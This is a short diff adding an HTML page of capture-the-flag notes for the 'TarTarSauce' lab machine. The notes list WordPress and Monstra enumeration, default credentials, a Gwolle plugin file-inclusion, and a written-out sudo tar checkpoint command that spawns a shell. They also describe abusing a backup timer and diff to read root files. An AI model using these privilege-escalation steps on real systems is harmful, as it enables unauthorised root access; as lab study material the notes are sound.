@@ -1,0 +1,30 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>TarTarSauce - Wordpress Tar systemd timers Bash Bugs</title>
+</head><body>wpscan <br/>
+Gobuster<br/>
+<br/>
+Monstra-3.0.4.<br/>
+monstra-3.0.4/admin<br/>
+&nbsp;&#09;default credentials: admin:admin<br/>
+But errors editing templates! They must be read-only.<br/>
+Unable to create a backup as well.<br/>
+Can't see 'created' directories. Can't upload files. So nothing really to do in Monstra.<br/>
+<br/>
+Gwolle plugin RFI<br/>
+sudo tar abuse<br/>
+sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash<br/>
+<br/>
+systemd timers show a new thing!<br/>
+locate backuperer<br/>
+/etc/systemd/system/multi-user.target.wants/backuperer.timer<br/>
+/lib/systemd/system/backuperer.service<br/>
+/lib/systemd/system/backuperer.timer<br/>
+/usr/sbin/backuperer<br/>
+<br/>
+<br/>
+Exploiting tar's functionality to keep file permissions. Ie tar something as root locally, and then on another machine untar it. <br/>
+<br/>
+Exploiting root calling diff to read files in the script</body></html>
